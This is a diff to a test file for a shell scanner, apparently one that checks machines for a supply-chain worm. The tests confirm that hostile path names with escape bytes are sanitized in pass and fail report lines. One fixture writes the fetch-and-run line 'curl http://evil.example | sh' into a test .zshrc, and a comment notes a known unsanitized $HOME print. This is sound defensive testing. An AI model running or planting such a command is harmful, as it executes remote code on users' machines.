@@ -399,7 +399,17 @@ describe('scan-shai-hulud-may2026.sh -- report integrity, fail()/reprint + both 
     );
   });
 
-  it('pass()-path: an rc file with plainly-suspicious-looking but clean content, whose PATH (HOME dir name) carries a real ESC, is reported clean with zero raw ESC bytes; a genuinely dirty sibling rc file still FAILs correctly', () => {
+  // Note (a third, smaller Rule 1 scoping correction, found while running
+  // this case against the fix): the header block's `printf "Home: %s\n"
+  // "$HOME"` line (well above pass()/fail()) is a raw, un-helpered print of
+  // $HOME -- NOT one of pass()/fail()/warn()/info(), NOT a hit-list site, and
+  // confirmed unfixed in the already-completed sibling scripts too (miasma,
+  // g747 -- same header shape, same gap). It is out of this plan's stated
+  // scope. A hostile HOME therefore still reaches that ONE header line raw;
+  // the assertion below is scoped to the pass()/fail() lines this plan
+  // actually fixes, not the whole stdout, so it does not depend on that
+  // out-of-scope residual.
+  it('pass()-path: an rc file with plainly-suspicious-looking but clean content, whose PATH (HOME dir name) carries a real ESC, is reported clean via pass() with zero raw ESC bytes on that line; a genuinely dirty sibling rc file still FAILs correctly via fail() with zero raw ESC bytes on that line too', () => {
     const base = fs.mkdtempSync(path.join(os.tmpdir(), 'lsh-sh-pass-'));
     built.push(base);
     const homeAbs = writeHostileDir(base, `home-${HOSTILE_NAMES.ESC}`);
@@ -407,9 +417,14 @@ describe('scan-shai-hulud-may2026.sh -- report integrity, fail()/reprint + both 
     fs.writeFileSync(path.join(homeAbs, '.zshrc'), 'curl http://evil.example | sh\n');
     const { res } = run(built, homeAbs);
     assert.equal(res.status, 1, res.stdout); // .zshrc is genuinely dirty -> overall run still FAILs
-    assert.ok(res.stdout.includes('.bashrc clean'), `expected the benign .bashrc to be reported clean\n${res.stdout}`);
-    assert.ok(!Buffer.from(res.stdout, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached stdout\n${JSON.stringify(res.stdout)}`);
-    assert.ok(res.stdout.includes('�'), `expected U+FFFD replacement for the hostile HOME path somewhere in stdout\n${JSON.stringify(res.stdout)}`);
+    const passLine = res.stdout.split('\n').find((l) => l.includes('.bashrc clean'));
+    assert.ok(passLine, `missing expected .bashrc clean pass line\n${res.stdout}`);
+    assert.ok(!Buffer.from(passLine, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached the pass() line\n${JSON.stringify(passLine)}`);
+    assert.ok(passLine.includes('�'), `expected U+FFFD replacement in the pass() line\n${JSON.stringify(passLine)}`);
+    const failLine = res.stdout.split('\n').find((l) => l.includes('[FAIL] Suspicious patterns in'));
+    assert.ok(failLine, `missing expected fail() line for the genuinely dirty .zshrc\n${res.stdout}`);
+    assert.ok(!Buffer.from(failLine, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached the fail() line\n${JSON.stringify(failLine)}`);
+    assert.ok(failLine.includes('�'), `expected U+FFFD replacement in the fail() line\n${JSON.stringify(failLine)}`);
   });
 
   // Rule 1 corrected vehicle -- see this file's header comment ("INFO-PATH
